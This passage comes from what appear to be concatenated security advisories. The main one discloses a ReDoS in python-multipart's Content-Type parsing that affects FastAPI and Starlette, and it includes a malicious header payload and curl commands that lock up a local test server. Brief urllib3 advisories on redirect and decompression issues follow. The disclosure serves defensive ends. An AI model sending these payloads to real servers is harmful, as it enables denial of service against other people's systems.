This can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS  This only applies when the app uses form data, parsed with `python-multipart`.  ### Details  A regular HTTP `Content-Type` header could look like:  ``` Content-Type: text/html; charset=utf-8 ```  `python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74  A custom option could be made and sent to the server to break it with:  ``` Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ ```  ### PoC  Create a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:  ```Python # main.py from wsgiref.simple_server import make_server from wsgiref.validate import validator  from multipart.multipart import parse_options_header   def simple_app(environ, start_response):     _, _ = parse_options_header(environ[\"CONTENT_TYPE\"])      start_response(\"200 OK\", [(\"Content-type\", \"text/plain\")])     return [b\"Ok\"]   httpd = make_server(\"\", 8123, validator(simple_app)) print(\"Serving on port 8123...\") httpd.serve_forever() ```  Then send the attacking request with:  ```console $ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8123/' ```  ### Impact  This is a ReDoS, (Regular expression Denial of Service), so it only applies to those using python-multipart to read form data, such as Starlette and FastAPI.  ### Original Report  This was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r  <details> <summary>Original report to FastAPI</summary>  Hey Tiangolo!  My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).  Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:  ```Python from typing import Annotated from fastapi.responses import HTMLResponse from fastapi import FastAPI,Form from pydantic import BaseModel  class Item(BaseModel):     username: str  app = FastAPI()  @app.get(\"/\", response_class=HTMLResponse) async def index():     return HTMLResponse(\"Test\", status_code=200)  @app.post(\"/submit/\") async def submit(username: Annotated[str, Form()]):     return {\"username\": username}  @app.post(\"/submit_json/\") async def submit_json(item: Item):     return {\"username\": item.username} ```  I'm running the above with uvicorn with the following command:  ```console uvicorn server:app ```  Then run the following cUrl command:  ``` curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/' ```  You'll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%  You can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you'll completely DoS the FastApi server.  If you try submitting Json to the /submit_json endpoint with the malicious Content-Type header you'll see it isn't vulnerable. So this only affects FastAPI when it parses Form data.  Cheers  #### Impact  An attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.  #### Occurrences  [params.py L586](https://github.com/tiangolo/fastapi/blob/d74b3b25659b42233a669f032529880de8bd6c2d/fastapi/params.py#L586)  </details>"}, {"id": "GHSA-59g5-xgcq-4qw3", "fix_versions": ["0.0.18"], "aliases": ["CVE-2024-53981"], "description": "### Summary  When parsing form data, `python-multipart` skips line breaks (CR `\\r` or LF `\\n`) in front of the first boundary and any tailing bytes after the last boundary.

The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request(\"GET\", \"https://httpbin.org/redirect/1\") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.

When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.  The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.   ### Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.  `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.   ### Remediation  Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.  If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.   ### Credits  The issue was reported by @Cycloctane.
